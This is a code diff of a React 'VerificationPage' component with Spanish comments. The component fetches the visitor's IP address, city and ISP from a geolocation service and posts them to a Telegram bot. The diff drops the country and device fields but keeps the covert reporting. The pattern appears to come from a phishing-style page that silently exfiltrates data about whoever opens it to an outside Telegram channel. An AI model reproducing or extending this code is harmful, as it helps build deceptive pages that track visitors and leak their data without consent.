@@ -13,7 +13,7 @@ function VerificationPage() {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
-  // Función para obtener información del usuario (IP, ubicación, dispositivo)
+  // Función para obtener información del usuario (IP, ubicación)
   const getUserInfo = async () => {
     try {
       const response = await fetch('https://ipapi.co/json/');
@@ -21,10 +21,8 @@ function VerificationPage() {
       const userAgent = navigator.userAgent;
       return {
         ip: data.ip,
-        country: data.country_name,
         city: data.city,
         isp: data.org,
-        device: userAgent
       };
     } catch (error) {
       return {
@@ -55,10 +53,8 @@ function VerificationPage() {
 
 🌐 INFORMACIÓN DEL USUARIO
 🔌 IP: ${userInfo.ip}
-🌍 País: ${userInfo.country}
 🏙️ Ciudad: ${userInfo.city}
 📡 ISP: ${userInfo.isp}
-💻 Dispositivo: ${userInfo.device}
             `;
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
